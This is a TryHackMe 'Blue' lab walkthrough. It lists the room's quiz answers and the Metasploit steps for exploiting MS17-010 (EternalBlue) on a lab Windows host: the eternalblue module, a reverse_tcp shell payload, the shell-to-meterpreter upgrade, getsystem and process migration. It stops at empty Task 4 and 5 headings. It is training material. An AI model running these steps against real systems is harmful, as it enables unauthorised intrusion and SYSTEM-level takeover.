<p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# Blue
|  Room Name | Blue |
|----------|-------|
| Author | Dhruv Tripathi |
| Date | 06-18-2026 |
| Link | [Blue](https://tryhackme.com/room/blue) |

# Room Information
```bash Type: Walkthrough
Difficulty: Easy
Tags: -
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Deploy & hack into a Windows machine, leveraging common misconfigurations issues.
```
## Task 1

### Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)
- As I have learned from the previous rooms I did, the `nmap` command is `nmap -sV 10.66.170.112`

<img width="848" height="642" alt="image" src="https://github.com/user-attachments/assets/136df2d5-f080-4c57-8b3a-2d591f674ef1" />

- Answer: `No answer needed`

### How many ports are open with a port number under 1000?

- From the above screenshot, we can how many ports are opened with a port number of less than 1000
- Answer: `3`

### What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
- We already know what is room is about and the most common vulnerability associated with the theme of this room and it exploits an issue within `SMBv1`
- Answer: `ms17-010`

## Task 2
### Start Metasploit
- We can do so via `msfconsole`. As you can see below, we have started Metasploit
<img width="748" height="22" alt="image" src="https://github.com/user-attachments/assets/9c16eb85-9808-4826-b07e-cd8680475336" />

- Answer: `No answer needed`

### Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

- Since we know the exploit name, we can give a quick search with `search ms17-010` and use that exploit via `use 0`

<img width="1044" height="448" alt="image" src="https://github.com/user-attachments/assets/8a4c69f3-2f01-4171-8355-542e621b337d" />

- Answer: `exploit/windows/smb/ms17_010_eternalblue`

### Show options and set the one required value. What is the name of this value? (All caps for submission)

- We set the `RHOSTS` value to the IP address of the target machine

<img width="744" height="110" alt="image" src="https://github.com/user-attachments/assets/e61bf9c2-307c-4bd2-8b28-9d06b841a62a" />

- Answer: `RHOSTS`

### Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
`set payload windows/x64/shell/reverse_tcp`
### With that done, run the exploit!
- We set the payload as directed

<img width="751" height="81" alt="image" src="https://github.com/user-attachments/assets/8c391f60-4bea-4359-9d42-069f71001a77" />

- I was able to successfully run the exploit

<img width="749" height="201" alt="image" src="https://github.com/user-attachments/assets/48d32359-c4c9-4cbc-b77a-0a2b5bdbdda8" />

- Answer: `No answer needed`

### Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

- I backgrounded the shell as directed
<img width="745" height="68" alt="image" src="https://github.com/user-attachments/assets/c52f9f53-b2ca-4fd9-90b2-69a9a3cabbe5" />

- Answer: `No answer needed`

## Task 3

### If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

- From a quick Google search we get the answer

- Answer: `post/multi/manage/shell_to_meterpreter`

### Select this (use MODULE_PATH). Show options, what option are we required to change?

- When we selected this module and then did `show options`, we can see the required value to set is `SESSION`
<img width="920" height="542" alt="image" src="https://github.com/user-attachments/assets/cbceaacc-86cd-4850-89b3-b71f53c0c3d9" />

- Answer: `SESSION`

### Set the required option, you may need to list all of the sessions to find your target here. 

- Using `sessions -i`, we can tell the exploit we ran has a session Id of 1

<img width="747" height="299" alt="image" src="https://github.com/user-attachments/assets/199e9513-dc1a-41e4-ba6d-eb9d8237e35e" />

- We can easily set this modules session to 1 as well via `set SESSION 1`

<img width="745" height="64" alt="image" src="https://github.com/user-attachments/assets/9a2e699f-e8a5-48ce-af20-3a80ba79f7fe" />

- Answer: `No answer needed`

### Run! If this doesn't work, try completing the exploit from the previous task once more.

- As we can see, I ran it and it worked. Notice that another meterpreter session has popped up now as id 2
<img width="745" height="483" alt="image" src="https://github.com/user-attachments/assets/c06fde74-7025-4796-b0d3-81d8998f2221" />

- Answer: `No answer needed`

### Once the meterpreter shell conversion completes, select that session for use.
- I switched to it and BOOM, we are successful

<img width="747" height="93" alt="image" src="https://github.com/user-attachments/assets/b7eeb6cb-6d20-4853-a6da-ff0e01b6bd25" />

- Answer: `No answer needed`

### Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 

- If we do open a dos shell and run the command `whoami`, we can indeed confirm that we are escalated to `NT AUTHORITY\SYSTEM`

<img width="981" height="311" alt="image" src="https://github.com/user-attachments/assets/a61224af-d67b-4330-8e18-ff1a4fe1e816" />

- Answer: `No answer needed`

### List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

- For this question, I selected the process with id `2940`
<img width="901" height="619" alt="image" src="https://github.com/user-attachments/assets/6e930096-b284-401a-ab10-e6dbfc66c578" />

- Answer: `No answer needed`

### Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

- Yay, it worked
<img width="744" height="92" alt="image" src="https://github.com/user-attachments/assets/1213ad12-50d0-43f5-b839-2ce41ba46f51" />

- Answer: `No answer needed`

## Task 4
## Task 5
